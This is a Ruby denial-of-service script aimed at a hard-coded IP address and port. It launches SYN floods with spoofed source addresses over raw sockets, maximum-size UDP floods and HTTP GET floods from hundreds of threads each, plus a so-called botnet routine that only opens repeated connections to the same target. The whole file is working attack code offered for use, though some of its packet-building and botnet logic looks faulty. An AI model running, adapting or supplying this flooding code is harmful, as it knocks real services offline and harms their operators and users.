require 'socket'
require 'thread'

# Target information
target_ip = '185.22.184.173'
target_port = 8087

# Thread count
thread_count = 500

# UDP Flood settings
udp_payload = "\x00" * 65507  # Maximum UDP packet size

# SYN Flood function
def syn_flood(ip, port)
    begin
      socket = Socket.new(Socket::AF_INET, Socket::SOCK_RAW, Socket::IPPROTO_TCP)
      socket.setsockopt(Socket::IPPROTO_IP, Socket::IP_HDRINCL, 1)
  
      ip_header = [69, 0, 40, rand(65535), 0, 64, Socket::IPPROTO_TCP, 0].pack('C2 n3 C2 n2')
      src_ip = [rand(2**32)].pack('N')
      dst_ip = [Socket.getaddrinfo(ip, nil, Socket::AF_INET, Socket::SOCK_STREAM).first[3]].pack('N')  # IP'yi doğru al
  
      tcp_header = [rand(65535), port, rand(2**32), 0, 80, 2, 8192, 0, 0].pack('n2 N2 n2 C2 n')
  
      packet = ip_header + src_ip + dst_ip + tcp_header
  
      loop do
        socket.send(packet, 0, Socket.pack_sockaddr_in(port, ip))
      end
    rescue => e
      puts "Error: #{e.message}"
    end
  end
  

# UDP Flood function
def udp_flood(ip, port, payload)
    begin
      socket = UDPSocket.new
      loop do
        socket.send(payload, 0, ip, port)
      end
    rescue => e
      puts "Error: #{e.message}"
    ensure
      socket.close
    end
  end
  
# HTTP GET Flood function
def http_get_flood(ip, port)
    begin
      loop do
        socket = TCPSocket.new(ip, port)
        request = "GET / HTTP/1.1\r\nHost: #{ip}\r\nConnection: close\r\n\r\n"
        socket.write(request)
        socket.close
      end
    rescue => e
      puts "Error: #{e.message}"
    end
  end
  

# Start threads
threads = []

# SYN Flood
threads << Thread.new do
  thread_count.times do
    Thread.new { syn_flood(target_ip, target_port) }
  end
end

# UDP Flood
threads << Thread.new do
  thread_count.times do
    Thread.new { udp_flood(target_ip, target_port, udp_payload) }
  end
end

# HTTP GET Flood
threads << Thread.new do
  thread_count.times do
    Thread.new { http_get_flood(target_ip, target_port) }
  end
end

# Create botnet
def create_botnet(ip, port)
    botnet = []
    100.times do
      begin
        socket = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM, 0)
        sockaddr = Socket.pack_sockaddr_in(port, ip)  # Doğru bir sockaddr yapısı oluşturulmalı
        socket.connect(sockaddr)
        botnet << socket
      rescue => e
        puts "Botnet connection error: #{e.message}"
      end
    end
    botnet
  end
  

# Start botnet
botnet = create_botnet(target_ip, target_port)

# Start botnet threads
botnet_threads = []
botnet_threads << Thread.new do
  loop do
    botnet.each do |socket|
      socket.write("Attacking bot\n")
    end
  end
end

threads.each(&:join)
botnet_threads.each(&:join)
